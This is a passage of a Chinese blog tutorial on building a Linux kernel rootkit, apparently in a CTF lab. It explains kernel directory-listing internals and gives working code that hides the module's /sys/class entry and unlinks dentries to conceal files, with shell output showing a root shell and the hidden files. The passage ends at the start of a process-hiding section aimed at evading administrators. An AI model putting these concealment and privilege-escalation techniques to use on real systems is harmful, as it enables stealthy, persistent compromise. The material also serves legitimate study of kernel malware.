class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="sys-class-信息隐藏"><a href="#sys-class-信息隐藏" class="headerlink" title="&#x2F;sys&#x2F;class&#x2F;信息隐藏"></a>&#x2F;sys&#x2F;class&#x2F;信息隐藏</h3><p>我们在创建 <code>/dev/</code> 设备文件接口时创建了一个 class，而这可以被在 <code>/sys/class</code> 目录下发现，因此我们还需要完成对 class 的隐藏。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/class/</span><br><span class="line">ata_device     dma_heap       mdio_bus       ptp            spi_slave</span><br><span class="line">ata_link       dmi            mem            pwm            thermal</span><br><span class="line">ata_port       extcon         misc           rapidio_port   tpm</span><br><span class="line">backlight      firmware       mmc_host       regulator      tpmrm</span><br><span class="line">bdi            gpio           nd             remoteproc     tty</span><br><span class="line">block          graphics       net            rfkill         usb_role</span><br><span class="line">bsg            hwmon          pci_bus        rootkit_class  vc</span><br><span class="line">dax            i2c-adapter    pci_epc        rtc            vfio</span><br><span class="line">devcoredump    i2c-dev        phy            scsi_device    virtio-ports</span><br><span class="line">devfreq        input          power_supply   scsi_disk      vtconsole</span><br><span class="line">devfreq-event  intel_scu_ipc  powercap       scsi_generic   wakeup</span><br><span class="line">devlink        iommu          ppp            scsi_host      watchdog</span><br><span class="line">dma            leds           pps            spi_master</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kset_unregister</span><span class="params">(struct kset *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!k)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">kobject_del(&amp;k-&gt;kobj);</span><br><span class="line">kobject_put(&amp;k-&gt;kobj);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kset_unregister);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">class_unregister</span><span class="params">(struct class *cls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">pr_debug(<span class="string">&quot;device class &#x27;%s&#x27;: unregistering\n&quot;</span>, cls-&gt;name);</span><br><span class="line">class_remove_groups(cls, cls-&gt;class_groups);</span><br><span class="line">kset_unregister(&amp;cls-&gt;p-&gt;subsys);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">class_destroy</span><span class="params">(struct class *cls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((cls == <span class="literal">NULL</span>) || (IS_ERR(cls)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">class_unregister(cls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里粗略的查看一下<code>class_destroy</code>的基本流程会发现其是通过<code>kobject_del</code>函数进行删除的，所以这里其实可以和<code>/sys/module/</code>进行隐藏时的操作一样即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobject_del(&amp;(((struct kset *)module_class-&gt;p)-&gt;kobj));</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/class/ | grep rootkit</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>最终实现隐藏。</p><h3 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h3><p>在前文中，在创建设备后可以在<code>/dev</code>目录中看到设备，并且我们的rootkit需要长期驻留在系统中，如果想每一次开机都自动载入我们的rootkit，这也就要求我们的rootkit文件还需要保留在系统中。所以接下来需要我们进行文件隐藏了。</p><p>在linux中我们最常用的便利文件夹的命令是<code>ls</code>，这里追踪一下<code>ls</code>所使用了什么系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;.&quot;</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = <span class="number">3</span></span><br><span class="line">fstat(<span class="number">3</span>, &#123;st_mode=S_IFDIR|<span class="number">0755</span>, st_size=<span class="number">832</span>, ...&#125;) = <span class="number">0</span></span><br><span class="line">getdents64(<span class="number">3</span>, <span class="comment">/* 26 entries */</span>, <span class="number">32768</span>)  = <span class="number">904</span></span><br><span class="line">getdents64(<span class="number">3</span>, <span class="comment">/* 0 entries */</span>, <span class="number">32768</span>)   = <span class="number">0</span></span><br><span class="line">close(<span class="number">3</span>)                                = <span class="number">0</span></span><br><span class="line">fstat(<span class="number">1</span>, &#123;st_mode=S_IFCHR|<span class="number">0620</span>, st_rdev=makedev(<span class="number">0x88</span>, <span class="number">0</span>), ...&#125;) = <span class="number">0</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;busybox-1.36.1\texp.c  linux-5.11&quot;</span>..., <span class="number">189b</span>usybox<span class="number">-1.36</span><span class="number">.1</span><span class="built_in">exp</span>.c  linux<span class="number">-5.11</span>  Makefile  modules.order  Module.symvers  rootfs  rootfs.cpio  rootkit.c  rootkit.korootkit.mod  rootkit.mod.c  rootkit.mod.o  rootkit.o  x</span><br><span class="line">) = <span class="number">189</span></span><br><span class="line">close(<span class="number">1</span>)                                = <span class="number">0</span></span><br><span class="line">close(<span class="number">2</span>)                                = <span class="number">0</span></span><br><span class="line">exit_group(<span class="number">0</span>)                           = ?</span><br><span class="line">+++ exited with <span class="number">0</span> +++</span><br></pre></td></tr></table></figure><p>前面大多是glibc库的许多系统调用比如创建内存等所以这里省略了，从这里开始，能够注意到的是这里存在<code>getdents64</code>这样一个系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(getdents64, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd,</span><br><span class="line">struct linux_dirent64 __user *, dirent, <span class="keyword">unsigned</span> <span class="keyword">int</span>, count)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">getdents_callback64</span> <span class="title">buf</span> =</span> &#123;</span><br><span class="line">.ctx.actor = filldir64,</span><br><span class="line">.count = count,</span><br><span class="line">.current_dir = dirent</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">f = fdget_pos(fd);</span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = iterate_dir(f.file, &amp;buf.ctx);</span><br><span class="line"><span class="keyword">if</span> (error &gt;= <span class="number">0</span>)</span><br><span class="line">error = buf.error;</span><br><span class="line"><span class="keyword">if</span> (buf.prev_reclen) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> __<span class="title">user</span> * <span class="title">lastdirent</span>;</span></span><br><span class="line">typeof(lastdirent-&gt;d_off) d_off = buf.ctx.pos;</span><br><span class="line"></span><br><span class="line">lastdirent = (<span class="keyword">void</span> __user *) buf.current_dir - buf.prev_reclen;</span><br><span class="line"><span class="keyword">if</span> (put_user(d_off, &amp;lastdirent-&gt;d_off))</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">error = count - buf.count;</span><br><span class="line">&#125;</span><br><span class="line">fdput_pos(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在内核中查看其源码可以看到第一个参数就是一个文件描述符，所以前面传入的3即<code>openat</code>当前目录所得到的文件描述符。</p><p>回到上述代码，其中的<code>fdget_pos</code>函数和<code>fdput_pos</code>函数对应的是对文件描述符进行加锁和解锁的操作，这里主要的实现函数是<code>iterate_dir</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">iterate_dir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line"><span class="keyword">bool</span> shared = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> res = -ENOTDIR;</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_op-&gt;iterate_shared)</span><br><span class="line">shared = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = security_file_permission(file, MAY_READ);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (shared)</span><br><span class="line">res = down_read_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">res = down_write_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</span><br><span class="line">ctx-&gt;pos = file-&gt;f_pos;</span><br><span class="line"><span class="keyword">if</span> (shared)</span><br><span class="line">res = file-&gt;f_op-&gt;iterate_shared(file, ctx);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">res = file-&gt;f_op-&gt;iterate(file, ctx);</span><br><span class="line">file-&gt;f_pos = ctx-&gt;pos;</span><br><span class="line">fsnotify_access(file);</span><br><span class="line">file_accessed(file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (shared)</span><br><span class="line">inode_unlock_shared(inode);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">inode_unlock(inode);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(iterate_dir)</span><br></pre></td></tr></table></figure><p>Linux系统可以适用于不同的文件系统的原因就是中间存在一层VFS层，在内核中使用<code>file</code>结构体来表示一个文件，而每个文件都有一张函数表 <code>file_operations</code> 函数表对应相应的对该文件的相关操作（例如 read、write），该函数表取自该文件对应的 inode，最终取自相应的文件系统提供的具体函数，在这里会调用表中的函数指针 <code>iterate_shared</code> 或 <code>iterate</code>。</p><p><img   src="/images/image-20240216143807039.png"  alt="image-20240216143807039"></p><p>使用gdb简单调试发现Linux-5.10版本内核会调用<code>interate_shared</code>函数，继续调试会发现其最终调用<code>dcache_readdir</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dcache_readdir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span> =</span> file-&gt;f_path.dentry;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">cursor</span> =</span> file-&gt;private_data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">anchor</span> =</span> &amp;dentry-&gt;d_subdirs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">next</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dir_emit_dots(file, ctx))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;pos == <span class="number">2</span>)</span><br><span class="line">p = anchor;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!list_empty(&amp;cursor-&gt;d_child))</span><br><span class="line">p = &amp;cursor-&gt;d_child;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((next = scan_positives(cursor, p, <span class="number">1</span>, next)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!dir_emit(ctx, next-&gt;d_name.name, next-&gt;d_name.len,</span><br><span class="line">      d_inode(next)-&gt;i_ino, dt_type(d_inode(next))))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">ctx-&gt;pos++;</span><br><span class="line">p = &amp;next-&gt;d_child;</span><br><span class="line">&#125;</span><br><span class="line">spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line"><span class="keyword">if</span> (next)</span><br><span class="line">list_move_tail(&amp;cursor-&gt;d_child, &amp;next-&gt;d_child);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_del_init(&amp;cursor-&gt;d_child);</span><br><span class="line">spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">dput(next);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(dcache_readdir);</span><br></pre></td></tr></table></figure><p>可以注意到的是函数内部会通过<code>scan_positives</code>进行遍历获得next，最后通过<code>dir_emit</code>提交给vfs层。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">scan_positives</span><span class="params">(struct dentry *cursor,</span></span></span><br><span class="line"><span class="params"><span class="function">struct list_head *p,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">loff_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">struct dentry *last)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span> =</span> cursor-&gt;d_parent, *found = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line"><span class="keyword">while</span> ((p = p-&gt;next) != &amp;dentry-&gt;d_subdirs) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d</span> =</span> list_entry(p, struct dentry, d_child);</span><br><span class="line"><span class="comment">// we must at least skip cursors, to avoid livelocks</span></span><br><span class="line"><span class="keyword">if</span> (d-&gt;d_flags &amp; DCACHE_DENTRY_CURSOR)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (simple_positive(d) &amp;&amp; !--count) &#123;</span><br><span class="line">spin_lock_nested(&amp;d-&gt;d_lock, DENTRY_D_LOCK_NESTED);</span><br><span class="line"><span class="keyword">if</span> (simple_positive(d))</span><br><span class="line">found = dget_dlock(d);</span><br><span class="line">spin_unlock(&amp;d-&gt;d_lock);</span><br><span class="line"><span class="keyword">if</span> (likely(found))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (need_resched()) &#123;</span><br><span class="line">list_move(&amp;cursor-&gt;d_child, p);</span><br><span class="line">p = &amp;cursor-&gt;d_child;</span><br><span class="line">spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">cond_resched();</span><br><span class="line">spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">dput(last);</span><br><span class="line"><span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对<code>scan_positives</code>函数的分析会发现其首先<code>(p = p-&gt;next) != &amp;dentry-&gt;d_subdirs</code>判断是否已经遍历到本身，随后通过<code>list_entry</code>宏获得最终的<code>dentry</code>并返回的，这里使用的<code>dentry</code>中的<code>d_child</code>成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line"><span class="comment">/* RCU lookup touched fields */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> d_flags;<span class="comment">/* protected by d_lock */</span></span><br><span class="line"><span class="keyword">seqcount_spinlock_t</span> d_seq;<span class="comment">/* per dentry seqlock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_hash</span>;</span><span class="comment">/* lookup hash list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span><span class="comment">/* parent directory */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span><span class="comment">/* Where the name belongs to - NULL is</span></span><br><span class="line"><span class="comment"> * negative */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> d_iname[DNAME_INLINE_LEN];<span class="comment">/* small names */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ref lookup also touches following */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lockref</span> <span class="title">d_lockref</span>;</span><span class="comment">/* per-dentry lock and refcount */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span><span class="comment">/* The root of the dentry tree */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_time;<span class="comment">/* used by d_revalidate */</span></span><br><span class="line"><span class="keyword">void</span> *d_fsdata;<span class="comment">/* fs-specific data */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span><span class="comment">/* LRU list */</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> *d_wait;<span class="comment">/* in-lookup ones only */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span><span class="comment">/* child of parent list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span><span class="comment">/* our children */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * d_alias and d_rcu can share memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_alias</span>;</span><span class="comment">/* inode alias list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_in_lookup_hash</span>;</span><span class="comment">/* only for in-lookup ones */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">&#125; d_u;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>可能前面直接说<code>dentry</code>结构体会比较模糊，最好结合着这个结构体以及注释来看。</p><p><img   src="/images/image-20240216153243832.png"  alt="image-20240216153243832"></p><p>结合上图相信大家可以很快的理解到了。</p><p>所以在这里我们可以将一个文件的<code>dentry</code>从其<code>d_child</code>链表中脱链，就能够实现隐藏操作了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hide_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">tagret_file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">target_dentry</span>;</span></span><br><span class="line"></span><br><span class="line">    tagret_file = filp_open(filename, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!IS_ERR(tagret_file))</span><br><span class="line">    &#123;</span><br><span class="line">        target_dentry = tagret_file-&gt;f_path.dentry;</span><br><span class="line"></span><br><span class="line">        target_dentry-&gt;d_child.next-&gt;prev = target_dentry-&gt;d_child.prev;</span><br><span class="line">        target_dentry-&gt;d_child.prev-&gt;next = target_dentry-&gt;d_child.next;</span><br><span class="line"></span><br><span class="line">        filp_close(tagret_file, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过上述代码实现脱链操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ ls</span><br><span class="line">bin          home         lib64        root         sys</span><br><span class="line">dev          init         linuxrc      rootfs.cpio  usr</span><br><span class="line">etc          lib          proc         sbin</span><br><span class="line">~ $ ls /dev/ | grep rootkit</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># find /dev/ -name &quot;rootkit&quot;</span></span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">bin          home         lib64        root         sys</span><br><span class="line">dev          init         linuxrc      rootfs.cpio  usr</span><br><span class="line">etc          lib          proc         sbin</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>可以看到最终成功隐藏掉了<code>/dev/rootkit</code>以及根目录的<code>rootkit.ko</code>并且并不会影响其正常功能。</p><h3 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h3><p>提权的最终目的都是让我们的某一个进程拥有root权限，一个root权限的进程向交于处于内核态的模块来说可以做的事情更多，不过这个进程也是存在被发现的风险，所以接下来需要进行进程隐藏。</p><p>首先，众所周知Linux kernel中的PCB其实是<code>task_struct</code>结构体，多个 task_struct 之间相互连接成双向链表结构，若是运维人员选择遍历 task_struct 链表便很容易发现我们的恶意进程，因此我们需要将我们的进程从 task_struct 链表中摘除。</p><p>同样的，运维人员若是遍历 <code>/proc/pid</code> ，甚至是直接遍历所有进程号，则很容易发现我们的恶意进程，因此我们还需要将其从 pid 链表中摘除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span 